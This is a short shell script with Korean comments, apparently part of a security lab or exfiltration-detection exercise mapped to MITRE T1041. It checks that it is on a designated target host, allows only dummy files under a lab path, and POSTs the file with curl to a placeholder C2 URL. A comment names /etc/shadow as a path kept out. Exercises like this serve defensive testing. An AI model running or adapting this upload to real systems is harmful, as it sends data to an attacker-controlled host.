#!/bin/sh
# upload.sh — 데이터 송신 확인 (T1041 Exfiltration Over C2 Channel)
#
# 실습 더미 파일 하나를 수신 서버로 보내고 결과만 찍는다.
# dnscheck.sh 가 '이름 해석이 되는가'를 보는 것과 짝이다. 이쪽은 '데이터가
# 실제로 나가는가'를 본다. 둘을 같이 돌리면 DNS 차단 시 둘 다 실패한다.
#
# 호스트 상태를 바꾸지 않는다. 파일을 읽기만 하고 복구 대상이 아니다.
#
# 출력 첫 줄은 hostname 이어야 한다. run_payload_on_target 이 인스턴스 식별에 쓴다.
hostname

# 고정된 대상이 아니면 빠진다. 다른 인스턴스에서 나가면 수신 로그의
# 출발지 NAT 가 달라져 증거를 맞추기 어렵다.
case $(hostname) in
  @@TARGET@@.*) ;;
  *) echo "__MISS__"; exit 0 ;;
esac

URL="@@C2_URL@@"
SRC="@@SRC_FILE@@"
RUN_ID="@@RUN_ID@@"

# 송신 대상 경로 가드. 실습 더미 경로만 허용한다.
# 넓게 열어두면 호출부 오타가 /etc/shadow 같은 데 닿는다.
case "$SRC" in
  /opt/whs-lab-data/*) ;;
  *) echo "REFUSED: 허용된 실습 경로가 아님 ($SRC)"; exit 1 ;;
esac

echo "UPLOAD_BEGIN runid=$RUN_ID url=$URL src=$SRC"

if [ ! -f "$SRC" ]; then
  echo "NO_SRC: $SRC 가 없다 (인프라에서 더미를 심어야 한다)"
  echo "UPLOAD_END"
  exit 0
fi

echo "SRC_SIZE $(wc -c < "$SRC" | tr -d ' ')"

# -w 로 상태코드를, 본문은 그대로 받아 RESP 로 남긴다.
# 이름 해석이 막히면 여기서 http=000 으로 떨어진다 — 그게 BLOCK 단계의 결과다.
BODY=$(curl -s -m 8 -w '\nHTTP %{http_code}' \
         -X POST --data-binary @"$SRC" \
         "$URL/upload?name=$(basename "$SRC")&run=$RUN_ID" 2>&1)

echo "$BODY" | sed 's/^/RESP /'
echo "UPLOAD_END"
